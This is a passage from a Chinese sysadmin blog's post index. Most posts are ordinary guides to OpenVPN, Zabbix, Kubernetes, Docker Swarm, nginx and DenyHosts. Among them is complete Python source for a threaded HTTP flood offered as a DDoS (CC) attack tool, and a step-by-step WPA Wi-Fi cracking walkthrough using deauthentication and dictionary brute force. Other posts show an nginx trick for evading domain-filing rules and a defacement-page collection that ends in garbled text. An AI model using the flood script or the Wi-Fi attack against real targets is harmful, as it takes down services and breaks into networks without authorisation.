B):client端连接需要密码： $ docker run -v ${OVPN_DATA}:/etc/openvpn --rm -it kylemanna/openvpn easyrsa build-client-full CLIENTNAME 会让你输入几次密码，均为上面设置的密码（123456）。 生成密钥： $ docker run -v ${OVPN_DATA}:/etc/openvpn --rm kylemanna/openvpn ovpn_getclient CLIENTNAME &gt; ${OVPN_DATA}/CLIENTNAME.ovpn 创建server容器： $ docker run --name openvpn -v ${OVPN_DATA}:/etc/openvpn -d -p 1194:1194 --privileged kylemanna/openvpn 经过以上七个步骤，你将会在/root/ovpn-data中看到一个CLIENTNAME.ovpn文件，将其下载到本地，利用OpenVPN GUI连接即可。若使用密码连接时，需要输入上面设置的密码。 添加用户： 若要添加用户，重复上面步骤5和6即可。 删除用户： 进入docker容器内执行下面命令： $easyrsa revoke client1 $ easyrsa gen-crl $ cp /etc/openvpn/pki/crl.pem /etc/openvpn/crl.pem 退出容器，编辑${OVPN_DATA}/openvpn.conf 文件，添加如下内容，重启容器即可： $ crl-verify /etc/openvpn/crl.pe 参考：http://jkzhao.github.io/2016/09/06/vpn%E7%AE%80%E4%BB%8B%E5%8F%8Aopenvpn%E6%90%AD%E5%BB%BA/","tags":[{"name":"docker","slug":"docker","permalink":"http://www.an-time.top/tags/docker/"},{"name":"openvpn","slug":"openvpn","permalink":"http://www.an-time.top/tags/openvpn/"},{"name":"vpn","slug":"vpn","permalink":"http://www.an-time.top/tags/vpn/"}]},{"title":"使用nginx域名转发绕过备案","date":"2018-01-29T08:15:54.000Z","path":"2018/01/29/使用nginx域名转发绕过备案/","text":"简介：网站在阿里云上，由于原域名备案取消，需要重新备案，备案时间较长，总不能让网站在备案期间不能访问吧，而且seo方面也是不允许的。刚好手边有一个备过案能正常使用的域名，于是用nginx的反向代理功能实现域名转发，实现网站的不中断。 配置：找一台非阿里云的服务器，这里找的是腾讯云的机器。在上面安装nginx，配置文件如下： server { listen 80; server_name a.com; #设置成需要绑定的域名 location / { proxy_pass http://b.com; #可以使用的备过案的域名 proxy_set_header X-Real-IP $remote_addr; proxy_set_header User-Agent $http_user_agent; } 启动nginx，访问a.com即可被转发到b.com。","tags":[{"name":"nginx","slug":"nginx","permalink":"http://www.an-time.top/tags/nginx/"},{"name":"备案","slug":"备案","permalink":"http://www.an-time.top/tags/备案/"},{"name":"绕过","slug":"绕过","permalink":"http://www.an-time.top/tags/绕过/"}]},{"title":"zabbix分布式监控系统","date":"2017-12-27T12:57:15.000Z","path":"2017/12/27/zabbix分布式监控系统/","text":"简介：zabbix没什么好介绍的，就是一个监控系统。来说说分布式监控，就是为了降低zabbix-server的压力，用zabbix-proxy做一个中转；而且对于跨网络的机器，比较好控制。看下图，一切明了。 环境说明：zabbix版本是3.4 hostname ip addr os zabbix-server 192.168.1.101 centos7.4 zabbix-proxy 192.168.1.102 centos7.4 zabbix-agent 192.168.1.103 centos6.9 小手动起来：server端： 安装官方源 # rpm -ivh http://repo.zabbix.com/zabbix/3.4/rhel/7/x86_64/zabbix-release-3.4-2.el7.noarch.rpm httpd和mariadb # yum install httpd # yum install maridb* 安装zabbix # yum install zabbix-server-mysql # yum install zabbix-web-mysql 导入数据 # mysql -uroot -p&lt;password&gt; # create database zabbix character set utf8 collate utf8_bin; # grant all privileges on zabbix.* to zabbix@localhost identified by &apos;&lt;password&gt;&apos;; # flush privileges; # quite; # zcat /usr/share/doc/zabbix-server-mysql*/create.sql.gz | mysql -uzabbix -p zabbix 配置运行zabbix-server并做开机自启 # vi /etc/zabbix/zabbix_server.conf DBHost=localhost DBName=zabbix DBUser=zabbix DBPassword=&lt;password&gt; # systemctl start zabbix-server # systemctl enable zabbix-server 配置前端 修改/etc/httpd/conf.d/zabbix.conf文件，配置如下 php_value max_execution_time 300 php_value memory_limit 128M php_value post_max_size 16M php_value upload_max_filesize 2M php_value max_input_time 300 php_value always_populate_raw_post_data -1 php_value date.timezone Asia/Shanghai 打开http://192.168.1.101 ，按照步骤一步步填写数据，知道安装完，如下 账户密码：Admin:zabbix 配置自动注册 在前端创建代理，并启用 创建自动注册服务，并启用 这样，前端的配置结束。 proxy端： 安装官方源 # rpm -ivh http://repo.zabbix.com/zabbix/3.4/rhel/7/x86_64/zabbix-release-3.4-2.el7.noarch.rpm 安装mariadb # yum install mariadb 安装proxy # yum install zabbix-proxy-mysql 导入数据 # mysql -uroot -p&lt;password&gt; # create database zabbix character set utf8 collate utf8_bin; # grant all privileges on zabbix.* to zabbix@localhost identified by &apos;&lt;password&gt;&apos;; # quit; # zcat /usr/share/doc/zabbix-proxy-mysql*/schema.sql.gz | mysql -uzabbix -p zabbix 配置 # vi /etc/zabbix/zabbix_proxy.conf Server=192.168.1.101 #server的地址 Hostname=proxy_hb_2 #此处与前端配置的代理保持一致 DBHost=localhost DBName=zabbix DBUser=zabbix DBPassword=&lt;password&gt; 启动服务 # systemctl start zabbix-proxy # systemctl enable zabbix-proxy agent端： 安装官方源 # rpm -ivh http://repo.zabbix.com/zabbix/3.4/rhel/7/x86_64/zabbix-release-3.4-2.el7.noarch.rpm 安装zabbix-agent # yum install zabbix-agent 配置 # vim /etc/zabbix/zabbix_agent.conf Server=192.168.1.102 #proxy的地址 ServerActive=192.168.1.102 #proxy的地址，主动监听的地址 Hostname=agent_ds_server2 启动 # service zabbix-agent start # chkconfig zabbix-agent on 结果：代理的机器： 主机自动注册的结果： 监控的结果： 注意事项： 启动顺序要按照先server，再proxy，最后agent的顺序，否则会出现监控不到数据的情况。 数据图会出现汉语乱码的情况，参考中文乱码 推荐文章1 推荐文章2","tags":[{"name":"zabbix","slug":"zabbix","permalink":"http://www.an-time.top/tags/zabbix/"},{"name":"监控系统","slug":"监控系统","permalink":"http://www.an-time.top/tags/监控系统/"}]},{"title":"spring of hackers...","date":"2017-12-21T10:37:36.000Z","path":"2017/12/21/SpringOfHackers/","text":"此刻心情沉闷，什么也不想说，看视频听声音吧。。。。。。","tags":[]},{"title":"使用Minikube搭建本地Kubernetes环境","date":"2017-12-20T08:48:24.000Z","path":"2017/12/20/使用Minikube搭建本地Kubernetes环境/","text":"简介：Minikube可以实现一种轻量级的Kubernetes集群，通过在本地计算机上创建虚拟机并部署只包含单个节点的简单集群。Minikube适用于Linux，MacOS和Windows系统。Minikube CLI提供集群管理的基本操作，包括 start、stop、status、 和delete 环境：macos，virtualBox，docker 安装：# brew install kubectl # curl -Lo minikube http://kubernetes.oss-cn-hangzhou.aliyuncs.com/minikube/releases/v0.23.0/minikube-darwin-amd64 # chmod +x minikube # sudo mv minikube /usr/local/bin/ 启动：缺省Minikube使用VirtualBox驱动来创建Kubernetes本地环境 # minikube start --registry-mirror=https://registry.docker-cn.com 打开控制台：执行下面命令，浏览器会自动打开控制台 # minikube dashboard 操作用户使用Minikube CLI管理虚拟机上的Kubernetes环境，比如：启动，停止，删除，获取状态等。一旦Minikube虚拟机启动，用户就可以使用熟悉的Kubectl CLI在Kubernetes集群上执行操作。 部署应用： 创建镜像 使用如下代码server.js和dockerfile创建镜像 server.js: # cat server.js var http = require(&apos;http&apos;); var handleRequest = function(request, response) { console.log(&apos;Received request for URL: &apos; + request.url); response.writeHead(200); response.end(&apos;Hello version1!&apos;); }; var www = http.createServer(handleRequest); www.listen(8080); dockerfile: # cat dockerfile FROM node:6.9.2 EXPOSE 8080 COPY server.js . CMD node server.js 本教程使用Minikube，而不是将Docker镜像push到registry，可以使用与Minikube VM相同的Docker主机构建镜像，以使镜像自动存在。为此，请确保使用Minikube Docker守护进程.注意：如果不在使用Minikube主机时，可以通过运行eval $(minikube docker-env -u)来撤消此更改。 # eval $(minikube docker-env) 创建镜像： # docker build -t hello-node:v1 . 创建deployment 使用kubectl run命令创建Deployment来管理Pod。Pod根据hello-node:v1Docker运行容器镜像： # kubectl run test-node --image=hello-node:v1 --port=8080 查看deployment： # kubectl get deployments 查看pod： # kubectl get pods 查看event： # kubectl get events 查看kubectl配置： # kubectl config view 创建service默认情况，这Pod只能通过Kubernetes群集内部IP访问。要使hello-node容器从Kubernetes虚拟网络外部访问，须要使用Kubernetes Service暴露Pod。我们可以使用kubectl expose命令将Pod暴露到外部环境： # kubectl expose deployment test-node --type=LoadBalancer 查看service： # kubectl get services 通过–type=LoadBalancer flag来在群集外暴露Service，在支持负载均衡的云提供商上，将配置外部IP地址来访问Service。 在Minikube上，该LoadBalancer type使服务可以通过minikube Service 命令自动打开浏览器访问 # minikube service test-hello 查看日志： # kubectl logs 跟新应用 编辑server.js文件以返回新消息 # response.end(&apos;Hello version2!&apos;); 重新build镜像： # docker build -t hello-node:v2 . 跟新镜像： # kubectl set image deployment/test-hello test-hello=hello-node:v2 打开浏览器查看跟新： # minikube service hello-node 清理数据 # kubectl delete service hello-node # kubectl delete deployment hello-node 参考文档：https://yq.aliyun.com/articles/221687 http://docs.kubernetes.org.cn/126.html","tags":[{"name":"minikube","slug":"minikube","permalink":"http://www.an-time.top/tags/minikube/"},{"name":"kubernetes","slug":"kubernetes","permalink":"http://www.an-time.top/tags/kubernetes/"}]},{"title":"黑页","date":"2017-12-06T08:04:16.000Z","path":"2017/12/06/黑页/","text":"简介：从网上收集了一些黑页，个人觉得比较酷，收藏一下。 展示： 纯js黑页： 黑页2 黑页3 黑页4 源码：链接：https://pan.baidu.com/s/1nuTWEhV 密码:9hr4 #############################wbeisufomksjnoiwpelkjd noiwplfkc dnsiol;kwej ndlsknoplsfkn wsfnw ejndfkjenrj wkrfodjne r","tags":[{"name":"黑页","slug":"黑页","permalink":"http://www.an-time.top/tags/黑页/"}]},{"title":"docker监控工具---海鸥","date":"2017-12-05T09:14:19.000Z","path":"2017/12/05/docker监控工具-海鸥/","text":"简介：海鸥是Docker的最佳小伙伴，它为Docker实现了一套Web监控页面。使用Docker都希望有Web监控和管理界面，海鸥就是为此量身订造的。它可以通过一行命令安装运行，你在此能够监控你的所有Docker容器和镜像。现在，海鸥已经完美支持英语、简体中文和繁体中文！ 安装：# docker run -d -p 10086:10086 -v /var/run/docker.sock:/var/run/docker.sock tobegit3hub/seagull 测试：安装完后，访问ip:10086，即可进入海鸥的主界面，进行相应的操作。 [参考：https://github.com/tobegit3hub/seagull ]","tags":[{"name":"docker","slug":"docker","permalink":"http://www.an-time.top/tags/docker/"},{"name":"监控","slug":"监控","permalink":"http://www.an-time.top/tags/监控/"},{"name":"海鸥","slug":"海鸥","permalink":"http://www.an-time.top/tags/海鸥/"}]},{"title":"使用DenyHost告别ssh暴力破解","date":"2017-11-29T11:22:40.000Z","path":"2017/11/29/使用DenyHost告别ssh暴力破解/","text":"简介：DenyHosts是Python语言写的一个程序，它会分析sshd的日志文件（/var/log/secure），当发现多次重复的攻击时就会记录IP到/etc/hosts.deny文件，从而达到自动屏IP的功能。 实战： 安装： 使用centos7.4环境 # yum install -y denyhosts 配置： # vim /etc/denyhosts.conf 大部分配置都写好了，做稍微的修改即可： DENY_THRESHOLD_INVALID = 5 #无效用户名限制登陆次数 DENY_THRESHOLD_VALID = 10 #有效用户名限制登陆次数 DENY_THRESHOLD_ROOT = 5 #root限制登陆次数 AGE_RESET_ROOT = 1d #root用户登录失败计数归零的时间 ADMIN_EMAIL = root@localhost #管理员邮箱 设置黑白名单： # vim /etc/hosts.deny # vim /etc/hosts.allow 启动服务并作开机自启： # systemctl enable denyhosts # systemctl start denyhosts enjoy it!!!","tags":[{"name":"安全","slug":"安全","permalink":"http://www.an-time.top/tags/安全/"},{"name":"爆破","slug":"爆破","permalink":"http://www.an-time.top/tags/爆破/"},{"name":"ssh","slug":"ssh","permalink":"http://www.an-time.top/tags/ssh/"},{"name":"DenyHost","slug":"DenyHost","permalink":"http://www.an-time.top/tags/DenyHost/"}]},{"title":"python实现ddos攻击之cc攻击","date":"2017-11-24T02:11:22.000Z","path":"2017/11/24/python实现ddos攻击之cc攻击/","text":"简介：cc攻击是ddos攻击中很难防护的一种，这里参考网上一些资料，用python实现cc攻击。 代码：#!/usr/bin/python #coding=utf-8 import sys import threading import Queue import httplib import argparse def get_parse(): parser = argparse.ArgumentParser(description=&apos;A cc attack python program&apos;) parser.add_argument(&apos;-j&apos;, help=&quot;number of total jobs, default number 100000&quot;, action=&quot;store&quot;, dest=&apos;j&apos;, default=100000, type=int) parser.add_argument(&apos;-n&apos;, help=&quot;number of threads, default thread 100&quot;, action=&apos;store&apos;, dest=&apos;n&apos;, default=100, type=int) parser.add_argument(&apos;-u&apos;, help=&quot;url or ip, for example: &apos;[url]www.zz2u.com[/url]&apos; or &apos;192.157.233.244&apos;&quot;, action=&quot;store&quot;, dest=&quot;u&quot;) parser.add_argument(&apos;-i&apos;, help=&quot;index, for example: &apos;/index.php&apos;, if null input &apos;/&apos; or not use -i,default &apos;/&apos;&quot;, action=&quot;store&quot;, dest=&quot;i&quot;, default=&quot;/&quot;) parser.add_argument(&apos;-p&apos;, help=&quot;port, default 80 &quot;, action=&quot;store&quot;, dest=&quot;p&quot;, default=80, type=int) if(len(sys.argv) &lt; 2): parser.print_help() sys.exit() return parser.parse_args() def get_request(url, index=&apos;/&apos;, port=80): try: conn = httplib.HTTPConnection(url, port, timeout=0.01) conn.request(&quot;GET&quot;, index) r1 = conn.getresponse() #print r1.status, r1.reason except: pass class Worker(threading.Thread): def __init__(self, name, queue, url, index, port): threading.Thread.__init__(self) self.queue = queue self.url = url self.index =index self.port = port self.start() def run(self): # 著名的死循环，保证接着跑下一个任务 while True: # 队列为空则退出线程 if self.queue.empty(): break # 获取一个项目 foo = self.queue.get() # 模拟你要做的事情 get_request(self.url, self.index, self.port) # 打印 print self.getName(),&apos;:&apos;, foo # 告诉系统说任务完成 self.queue.task_done() def start_work(): args = get_parse() job_num = args.j thread_num = args.n url = args.u index = args.i port = args.p #print args, job_num, thread_num, url, index # 队列 queue = Queue.Queue() # 加入任务队列个数 for i in range(job_num): queue.put(i) # 开线程个数 for i in range(thread_num): threadName = &quot;Thread&quot; + str(i) Worker(threadName, queue, url, index, port) # 所有线程执行完毕后关闭 queue.join() if __name__ == &quot;__main__&quot;: start_work()","tags":[{"name":"ddos","slug":"ddos","permalink":"http://www.an-time.top/tags/ddos/"},{"name":"cc","slug":"cc","permalink":"http://www.an-time.top/tags/cc/"}]},{"title":"破解Wi-Fi密码","date":"2017-11-07T13:03:46.000Z","path":"2017/11/07/破解Wi-Fi密码/","text":"简介：目前无线渗透试的两种方法：1、抓握手包，跑包。2、通过WPS进行跑pin码当然第2种方法是要求路由器开启了wps功能。并且要求路由器没有设置pin防护，其它的方法如路由器漏洞等不在此讨论范围内。WEP方式认证的路由器已经很少了，而且这种认证方式不但非常不安全且绝对可破，不再讲解，本文只讲WPA认证方式的渗透方法。其实最有效的取得密码的方法是直接编个理由过去问！（社工）原理：抓到的包中有密码的密文，做暴力跑包即可。 工具： kali操作系统 一个支持监听模式的无线网卡 步骤：1.开启无线网卡监听模式 查看无线网卡 $ifconfig -a 可以从上图看出设备识别的无线网卡名字为wlan0 激活无线网卡 $ifconfig wlan0 up 没有任何提示，在linux下没有报错就是没有错 杀死干扰进程 $airmon-ng check kill 从上面图片可以看出，有关干扰进程都被杀掉 开启网卡监听模式 $airmon-ng start wlan0 使用上面的命令开启网卡的监听模式，记录下监听模式的名字，为mon0，如下图 再次查看设备，发现多出来一个监听模式的网卡信息，见下图 2.监听周围wifi状态，寻找要破解的无线路由器$airodump-ng mon0 使用上面的命令，可以监听到周围的无线网络，从中选择我们要破解的路由器的ssid，见下图 1:路由器mac地址 2:信号强度 3:路由器工作频道 4:wifi名字 5:连接在路由器的客户端的mac地址 3.监听要破解的路由器，攻击连接的无线设备使其自动掉线然后重连，来抓取握手包下面我们来破解名字为14_102的路由器，可以看出其mac地址为8C:A6:DF:69:DB:33，信道为6，使用下面命令监听该路由器并把监听的数据保存到名字为wifi里 $airodump-ng mon0 -c 6 --bssid 8C:A6:DF:69:DB:33 -w wifi -c:信道 –bssid:路由器mac地址 -w:保存数据的名字 在另一个终端来攻击连在该路由器的客户端，使其掉线然后自动重连，就能监控到含有密码的握手包 $aireplay-ng -0 1 -a 8C:A6:DF:69:DB:33 -c 00:CD:FE:65:46:5A mon0 -a:路由器mac地址 -c:客户端的mac地址，可以不加该参数，会把连在该路由器上的所有客户端搞掉线 测试的客户端是我的手机，发现手机掉线了，然后自动重新连接wifi。自动连接上后（握手成功），看到在监听端口出现如下标志，说明抓取握手包成功，可以停止攻击和监控 查看抓到的包的数据如下图 4.用字典跑包下面用我们的字典来跑抓到的数据包 $aircrack-ng -w dic.txt wifi-01.cap 成功爆出密码 说明：此文仅用于研究测试，请不要做破坏，博主不承担任何责任。。。。。。","tags":[{"name":"破解wifi","slug":"破解wifi","permalink":"http://www.an-time.top/tags/破解wifi/"},{"name":"kali","slug":"kali","permalink":"http://www.an-time.top/tags/kali/"},{"name":"aircrack-ng","slug":"aircrack-ng","permalink":"http://www.an-time.top/tags/aircrack-ng/"}]},{"title":"docker swarm集群搭建","date":"2017-11-06T03:28:22.000Z","path":"2017/11/06/docker-swarm集群搭建/","text":"简介：dokcer swarm是一个docker集群管理工具，把大量的docker容器集中管理，类似的还有k8s等。 准备：本案例需要2台以上机器，这里使用docker machine来生成3台虚拟机来测试。可根据自己资源多少来选择不同的方案。创建一个管理节点机器manager1，两个工作节点worker1和worker2 #docker-machine create --driver virtualbox manager1 #docker-machine create --driver virtualbox worker1 #docker-machine create --driver virtualbox worker2 现在，有两三台虚拟机，我们查看一下： #docker-machine ls NAME ACTIVE DRIVER STATE URL SWARM DOCKER ERRORS manager1 - virtualbox Running tcp://192.168.99.100:2376 v17.10.0-ce worker1 - virtualbox Running tcp://192.168.99.103:2376 v17.10.0-ce worker2 - virtualbox Running tcp://192.168.99.104:2376 v17.10.0-ce 创建swarm集群：用上面创建的3台虚拟机，来创建一个swarm集群，首先进入管理节点： #docker-machine ssh manager1 #docker swarm init --listen-addr 192.168.99.100:2377 --advertise-addr 192.168.99.100 Swarm initialized: current node (23lkbq7uovqsg550qfzup59t6) is now a manager. To add a worker to this swarm, run the following command: docker swarm join \\ --token SWMTKN-1-3z5rzoey0u6onkvvm58f7vgkser5d7z8sfshlu7s4oz2gztlvj-c036gwrakjejql06klrfc585r \\ 192.168.99.100:2377 To add a manager to this swarm, run &apos;docker swarm join-token manager&apos; and follow the instructions. 上面用 –listen-addr来指定监听的ip和端口。 接下来把worker1和worker2加入集群： #docker-machine ssh worker1 #docker swarm join --token SWMTKN-1-3z5rzoey0u6onkvvm58f7vgkser5d7z8sfshlu7s4oz2gztlvj-c036gwrakjejql06klrfc585r 192.168.99.100:2377 #docker-machine ssh worker2 #docker swarm join --token SWMTKN-1-3z5rzoey0u6onkvvm58f7vgkser5d7z8sfshlu7s4oz2gztlvj-c036gwrakjejql06klrfc585r 192.168.99.100:2377 上面可以加入参数–listen-addr作为监听准备，因为有时候可能遇到把一个worker节点提升为manager节点。本例不添加。 初始化成功后，现在，我们拥有了一个主节点两个从节点的swarm集群，进入管理节点查看一下相应信息： #docker-machine ssh manager1 #docker node ls ID HOSTNAME STATUS AVAILABILITY MANAGER STATUS tdbdcsorrtqymgmn71t5pfwxm * manager1 Ready Active Leader b5twxb6zeacvndsklkxenlhk2 worker1 Ready Active xdvapziebpux1iee52d4tvqa9 worker2 Ready Active 现在，每个节点都归属于swarm，并处于待机状态。manager1是管理节点，worker1和worker2是工作节点。 在管理节点上查看网络状态： #docker-machine ssh manager1 #docker network ls NETWORK ID NAME DRIVER SCOPE de994a4d6a4f bridge bridge local ca45f2e489de docker_gwbridge bridge local 3d22755e453b host host local rgpmn1hh5qe1 ingress overlay swarm 86b55cffdbd2 none null local 可以看到在 swarm 上默认已有一个名为 ingress 的 overlay 网络, 默认在 swarm 里使用，本例子中会创建一个新的 overlay 网络。 #docker network create --driver overlay swarm_test #docker network ls NETWORK ID NAME DRIVER SCOPE de994a4d6a4f bridge bridge local ca45f2e489de docker_gwbridge bridge local 3d22755e453b host host local rgpmn1hh5qe1 ingress overlay swarm 86b55cffdbd2 none null local n9jduvforkcm swarm_test overlay swarm 可以看到我们创建的网络swarm_test。 在跨主机网络上部署应用：首先，分别在各个节点上下载一个要部署应用的镜像： #docker-machine ssh manager1 #docker pull nginx #docker-machine ssh worker1 #docker pull nginx #docker-machine ssh worker2 #docker pull nginx 上面分别在3个节点上下载了nginx的镜像，下面在swarm中部署nginx应用： #docker service create --replicas 2 -p 7080:80 --name hello --networ=swarm_test nginx 查看服务： #docker service ls ID NAME MODE REPLICAS IMAGE PORTS sl4zi20wk6um hello replicated 2/2 nginx:latest *:7080-&gt;80/tcp 查看hello的详细情况： #docker service ps hello ID NAME IMAGE NODE DESIRED STATE CURRENT STATE ERROR PORTS 0b3pykmkl7i9 hello.2 nginx:latest manager1 Running Running 2 hours ago s7ud2yba1p0r hello.3 nginx:latest worker1 Running Running 2 hours ago 可以看出，两个容器分别运行在管理节点和worker1节点。 swarm自我修复能力：上面我们创建的service里面有两个实例，现在我们尝试一下杀掉其中一个实例，观察其反应： 杀掉worker1中的容器： #docker-machine ssh worker1 #docker kill 4f9d65b4ab70 查看服务实例状态： #docker-machine ssh manager1 #docker service ps hello ID NAME IMAGE NODE DESIRED STATE CURRENT STATE ERROR PORTS z9jbg1psmh7n hello.1 nginx:latest worker1 Running Running 1 second ago jhfcp9axso7m \\_ hello.1 nginx:latest worker1 Shutdown Failed 7 seconds ago &quot;task: non-zero exit (137)&quot; y8rbt67vpkfe hello.2 nginx:latest manager1 Running Running 5 minutes ago 可以看到，其中一个容器为shutdown状态，然后又启动了另外一个容器来代替关闭的容器 动态修改实例数：假如某个服务负载过大，我们可以对该服务动态平滑的扩容，当负载减下来的时候，可以减少容器数量，只需指定scale参数即可。我们用上面创建的hello服务来说明： #docker-machines ssh manager1 #docker service scale hello=3 hello scaled to 3 overall progress: 3 out of 3 tasks 1/3: running [==================================================&gt;] 2/3: running [==================================================&gt;] 3/3: running [==================================================&gt;] verify: Service converged 此时，查看服务，发现容器数量变成3个了： #docker service ps hello ID NAME IMAGE NODE DESIRED STATE CURRENT STATE ERROR PORTS veq6koi71ff8 hello.1 nginx:latest manager1 Running Running 26 seconds ago e42vqpp5fvbf hello.2 nginx:latest worker1 Running Running 26 seconds ago tic4n5absao7 hello.3 nginx:latest worker2 Running Running 12 seconds ago 现在，我们把容器减少到2个： #docker service scale hello=2 hello scaled to 2 overall progress: 2 out of 2 tasks 1/2: running [==================================================&gt;] 2/2: running [==================================================&gt;] verify: Service converged 此时，查看服务，发现容器数量变成了2: #docker service ps hello ID NAME IMAGE NODE DESIRED STATE CURRENT STATE ERROR PORTS e42vqpp5fvbf hello.2 nginx:latest worker1 Running Running 3 minutes ago tic4n5absao7 hello.3 nginx:latest worker2 Running Running 3 minutes ago 删除服务：假如某个服务我们不在需要了，可以直接把高服务删除。现在我们把上面创建的hello服务删除： #docker-machines ssh managers1 #docker service rm hello 再次查看服务，发现hello服务已经被删除了： #docker service ls ID NAME MODE REPLICAS IMAGE PORTS 删除节点：完成上面的测试，最终删除我们的虚拟机manager1，worker1和worker2: #docker-machine ls NAME ACTIVE DRIVER STATE URL SWARM DOCKER ERRORS manager1 - virtualbox Running tcp://192.168.99.100:2376 v17.10.0-ce worker1 - virtualbox Running tcp://192.168.99.103:2376 v17.10.0-ce worker2 - virtualbox Running tcp://192.168.99.104:2376 v17.10.0-ce 删除虚拟机： #docker-machine rm manager1 worker1 worker2 About to remove manager1, worker1, worker2 WARNING: This action will delete both local reference and remote instance. Are you sure? (y/n): y Successfully removed manager1 Successfully removed worker1 Successfully removed worker2 再次查看，已经没有了： #docker-machine ls NAME ACTIVE DRIVER STATE URL SWARM DOCKER ERRORS 结尾：swarm的基本姿势大致如上，我们可以把他用在我们的生产环境，与持续集成，持续部署等结合起来，最终可以达到无人值守的目的。","tags":[{"name":"docker swarm","slug":"docker-swarm","permalink":"http://www.an-time.top/tags/docker-swarm/"},{"name":"虚拟化","slug":"虚拟化","permalink":"http://www.an-time.top/tags/虚拟化/"},{"name":"集群","slug":"集群","permalink":"http://www.an-time.top/tags/集群/"}]},{"title":"短网址还原工具","date":"2017-10-24T01:20:10.000Z","path":"2017/10/24/短网址还原工具/","text":"简介：随着安全意识的不断提升，很多都开始使用短网址。这里写了一个小工具，实现把短网址还原成原来的网址。 实现：#coding = utf8 import urllib2, httplib, os, sys class RedirectHandler(urllib2.HTTPRedirectHandler): def http_error_301(self, req, fp, code, msg, headers): result = urllib2.HTTPRedirectHandler.http_error_301(self, req, fp, code, msg, headers) result.status = code return result def http_error_302(self, req, fp, code, msg, headers): result = urllib2.HTTPRedirectHandler.http_error_302(self, req, fp, code, msg, headers) result.status = code return result # Banner def Banner(): print(&quot;=================================================&quot;) print(&quot; pyLongURL &quot;) print(&quot;=================================================&quot;) # Usage def help_menu(cmd): print(&quot;Usage: %s &lt;short_URL&gt;\\n&quot;) % (cmd) print(&quot;Please enter need an URL!&quot;) def main(szURL): httplib.HTTPConnection.debuglevel = 1 request = urllib2.Request(szURL) opener = urllib2.build_opener(RedirectHandler()) f = opener.open(request) print(f.url) if __name__ == &quot;__main__&quot;: Banner() if len(sys.argv)&lt;2: help_menu(sys.argv[0]) else: main(sys.argv[1]) 测试：","tags":[{"name":"短网址还原","slug":"短网址还原","permalink":"http://www.an-time.top/tags/短网址还原/"},{"name":"工具","slug":"工具","permalink":"http://www.an-time.top/tags/工具/"}]},{"title":"用nginx搭建文件服务器","date":"2017-09-22T03:15:53.000Z","path":"2017/09/22/用nginx搭建文件服务器/","text":"简介工作需要，搭建一个文件服务器。 环境介绍先创建一台虚拟机，ip地址为：106.14.242.15 实战 配置源系统源 # wget -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo 安装nginx # yum install nginx -y 查找配置文件 # rpm -qc nginx 可以看到配置文件如下图： 修改配置文件 #cat /etc/nginx/nginx.conf # For more information on configuration, see: # * Official English Documentation: http://nginx.org/en/docs/ # * Official Russian Documentation: http://nginx.org/ru/docs/ user nginx; worker_processes auto; error_log /var/log/nginx/error.log; pid /run/nginx.pid; events { worker_connections 1024; } http { log_format main &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos; &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos; &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;; access_log /var/log/nginx/access.log main; sendfile on; tcp_nopush on; tcp_nodelay on; keepalive_timeout 65; types_hash_max_size 2048; include /etc/nginx/mime.types; default_type application/octet-stream; # Load modular configuration files from the /etc/nginx/conf.d directory. # See http://nginx.org/en/docs/ngx_core_module.html#include # for more information. include /etc/nginx/conf.d/*.conf; server { listen 80 ; server_name test.file.com; charset utf-8; # Load configuration files for the default server block. location / { root /data; index index.php index.html index.htm; autoindex on; autoindex_exact_size on; autoindex_localtime on; } access_log /var/log/file.log; error_page 404 /404.html; location = /40x.html { } error_page 500 502 503 504 /50x.html; location = /50x.html { } } } 创建文件目录和测试数据 # mkdir /data # cd /data # touch 123.txt # echo &apos;test&apos; &gt; 123.txt 结果测试浏览器访问地址，如下图：","tags":[{"name":"nginx","slug":"nginx","permalink":"http://www.an-time.top/tags/nginx/"},{"name":"文件服务器","slug":"文件服务器","permalink":"http://www.an-time.top/tags/文件服务器/"}]},{"title":"Markdown教程","date":"2017-08-14T14:54:19.000Z","path":"2017/08/14/Markdown教程/","text":"1234567891011---# [5. 其他][null-link]你可能还没注意到本文每部分之间的分割线和 `其他` 的链接其实没有链接我爱 `分割线`， 我爱 [**链接**][null-link]，哪怕它只有颜色~[null-link]: chrome://not-a-link 5. 其他你可能还没注意到本文每部分之间的分割线和 其他 的链接其实没有链接我爱 分割线， 我爱 链接，哪怕它只有颜色~ 123456789“`---`” 的上下最好各空一行---**P.S.** 补充一种高端的链接: [鼠标移过来，**先别单击** ~][hover][hover]: http://www.google.com.sg &quot;Google Sg 更快，更好用。好，现在单击吧&quot;代码如下： P.S. 补充一种高端的链接: 鼠标移过来，先别单击 ~ ~~~ （可惜 Google 被墙了） P.P.S. 图片链接：(点击图片可跳转） 代码如下：123[![][jane-eyre-pic]][jane-eyre-douban][jane-eyre-pic]: http://img3.douban.com/mpic/s1108264.jpg[jane-eyre-douban]: http://book.douban.com/subject/1141406/ （简书最新的 Markdown 不能使用图片链接。。。感受不爱）P.P.P.S. 更多的 Markdown 特性测试，见我的 Markdown 一篇博客 在简书中输入数学公式：见我的 简书中编辑数学公式 如何写出漂亮的 Markdown 文章？戳 Markdown 写作规范参考","tags":[{"name":"Markdown","slug":"Markdown","permalink":"http://www.an-time.top/tags/Markdown/"}]}]